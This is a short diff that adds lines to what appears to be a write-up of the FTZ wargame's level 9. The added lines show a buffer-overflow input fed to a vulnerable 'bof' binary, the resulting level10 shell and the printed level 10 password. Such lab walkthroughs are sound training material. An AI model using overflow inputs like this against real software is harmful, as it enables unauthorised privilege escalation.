@@ -89,3 +89,12 @@ Breakpoint 1, 0x08048493 in main () at bof.c:15
 Continuing.
 Good Skill!
 ```
+
+```
+[level9@ftz level9]$ /usr/bin/bof
+It can be overflow : AAAAAAAAAABBBBBBgo
+Good Skill!
+
+[level10@ftz level9]$ my-pass
+Level10 Password is "interesting to hack!".
+```
